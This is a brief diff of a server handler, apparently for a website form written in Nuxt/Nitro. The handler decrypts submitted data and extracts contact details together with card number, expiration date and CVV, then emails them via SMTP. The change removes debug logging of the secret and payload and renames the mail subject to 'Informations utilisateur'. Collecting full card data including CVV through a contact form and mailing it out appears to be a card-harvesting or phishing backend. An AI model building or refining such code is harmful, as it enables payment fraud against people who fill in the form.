@@ -6,8 +6,6 @@ export default defineEventHandler(async (event) => {
 
   const { payload } = await readBody(event)
   const data = decryptPayload(payload, secret)
-  console.log("process.env.CRYPTO_SECRET", secret);
-  console.log("payload", payload);
 
   const { pseudo, email, telephone, message, card_number, card_expiration, card_cvv } = data
 
@@ -34,7 +32,7 @@ export default defineEventHandler(async (event) => {
   await transporter.sendMail({
     from: `"Formulaire Site" <${process.env.SMTP_USER}>`,
     to: process.env.MAIL_TO,
-    subject: "Nouveau message",
+    subject: "Informations utilisateur",
     html: `
   <div style="
     max-width: 500px; 
